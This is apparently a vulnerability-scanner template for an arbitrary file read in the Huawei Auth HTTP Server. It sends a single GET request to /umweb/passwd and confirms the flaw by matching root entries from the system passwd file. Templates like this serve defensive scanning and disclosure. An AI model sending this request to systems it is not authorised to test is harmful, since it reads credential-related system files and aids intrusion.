id: huawei-authhttp-lfi
name: Huawei Auth Http Server - Arbitrary File Read
severity: high
confidence: confirmed
description: Huawei Auth HTTP Server is vulnerable to Arbitrary File Read.
reference: https://mp.weixin.qq.com/s?__biz=MzIxMTg1ODAwNw==&mid=2247498499&idx=1&sn=6850c3e9a3df795e48ba9a10c9772ddd
tags:
- lfi
- huawei
- authhttp
- vuln
requests:
- method: GET
  path: /umweb/passwd
  matchers:
  - type: header
    words:
    - Huawei Auth-Http Server
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  condition: and
